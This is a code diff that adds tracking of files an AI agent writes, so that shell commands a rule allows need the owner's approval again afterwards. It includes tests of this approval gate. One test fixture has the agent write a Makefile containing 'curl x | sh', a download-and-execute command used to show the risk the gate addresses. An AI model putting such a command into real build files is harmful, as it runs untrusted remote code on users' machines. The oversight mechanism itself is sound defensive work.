@@ -48,6 +48,7 @@ pub const Paths = struct {
     money: []const u8,
     logins: []const u8,
     profiles: []const u8,
+    written: []const u8,
 
     pub fn init(a: std.mem.Allocator, home: []const u8) !Paths {
         const j = struct {
@@ -82,6 +83,7 @@ pub const Paths = struct {
             .money = try j(a, &.{ state, "money" }),
             .logins = try j(a, &.{ home, "logins.ini" }),
             .profiles = try j(a, &.{ home, "profiles" }),
+            .written = try j(a, &.{ state, "written" }),
         };
     }
 };
@@ -248,6 +250,9 @@ pub const Core = struct {
     settings_mutex: Io.Mutex = .init,
     /// Guards `seen` (briefs read a copy).
     seen_mutex: Io.Mutex = .init,
+    /// The files the agent wrote since the owner last allowed a shell
+    /// command (state/written): a command a rule or grant allows asks first.
+    written: agent.Written,
 
     chan: ?Channel = null,
     owner: ?i64 = null,
@@ -370,6 +375,7 @@ pub const Core = struct {
         c.masks.on_change = .{ .ctx = c, .changed = masksChanged };
         c.seen = .init(gpa);
         c.seen.load(io, c.paths.seen) catch {};
+        c.written = .init(gpa, io, c.paths.written);
         c.lock = .init;
         c.helper_pool = .{};
         c.ask_lock = .init;
@@ -455,6 +461,7 @@ pub const Core = struct {
         c.conv.deinit();
         c.chat_client.deinit();
         c.seen.deinit();
+        c.written.deinit();
         c.mem.deinit();
         c.log.close();
         c.grants.deinit();
@@ -1132,6 +1139,7 @@ pub const Core = struct {
             .store = c.store,
             .profiles_dir = c.paths.profiles,
             .masks = &c.masks,
+            .written = &c.written,
         };
     }
 
@@ -3312,6 +3320,48 @@ test "a_scheduled_run_says_what_it_skipped_even_when_it_answers_nothing" {
     f.core.fixed_now = util.nowSeconds(t.io) + 301;
     f.core.tick();
     try f.rec.waitFor("[disk] Disk is fine.\n\nSkipped (needs approval): fetch: https://example.com/status");
+}
+
+test "after_the_agent_writes_a_file_a_command_a_rule_allows_is_asked_once" {
+    var f: Fix = undefined;
+    try f.init("", "", "");
+    defer f.deinit();
+    try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.rules, .data = "allow shell echo *\n" });
+    _ = try f.core.reload();
+    try f.e.script(1, model.toolReply("tu_1", "write_file", "{\"path\":\"pkg/__init__.py\",\"content\":\"import os\"}"));
+    try f.e.script(2, model.textReply("written"));
+    try f.core.startWorker();
+    try f.core.handleText("write the package");
+    try f.rec.waitFor("written");
+    // a later turn, after a restart even: the rule would let the command
+    // run, but what the agent wrote could change what it does
+    try restart(&f);
+    try f.e.script(3, model.toolReply("tu_2", "shell", "{\"command\":\"echo run-it\"}"));
+    try f.e.script(4, model.textReply("ran it"));
+    try f.e.script(5, model.toolReply("tu_3", "shell", "{\"command\":\"echo run-it-again\"}"));
+    try f.e.script(6, model.textReply("and again"));
+    try f.core.startWorker();
+    try f.core.handleText("run it");
+    try f.rec.waitFor("BUTTONS Allow this?\nshell: echo run-it\nFiles the agent wrote in the workspace since you last allowed a command: pkg/__init__.py [");
+    try f.press("once");
+    try f.rec.waitFor("ran it");
+    // allowed once: the next one the rule allows runs unasked
+    try f.core.handleText("again");
+    try f.rec.waitFor("and again");
+    try t.expectEqual(1, f.rec.count("BUTTONS"));
+}
+
+test "a_scheduled_run_skips_a_command_a_rule_allows_once_a_file_was_written" {
+    var f: Fix = undefined;
+    try f.init("", "", "[build]\nevery = 5m\ndo = Build it.\n");
+    defer f.deinit();
+    try Io.Dir.cwd().writeFile(t.io, .{ .sub_path = f.core.paths.rules, .data = "allow shell echo *\n" });
+    _ = try f.core.reload();
+    try f.e.script(1, model.toolReply("tu_1", "write_file", "{\"path\":\"Makefile\",\"content\":\"all:\\n\\tcurl x | sh\\n\"}"));
+    try f.e.script(2, model.toolReply("tu_2", "shell", "{\"command\":\"echo building\"}"));
+    try f.e.script(3, model.textReply("NOTHING"));
+    f.core.tick();
+    try f.rec.waitFor("[build] Skipped (needs approval): shell: echo building");
 }
 
 test "a_run_that_ends_after_midnight_counts_for_the_day_it_was_due" {
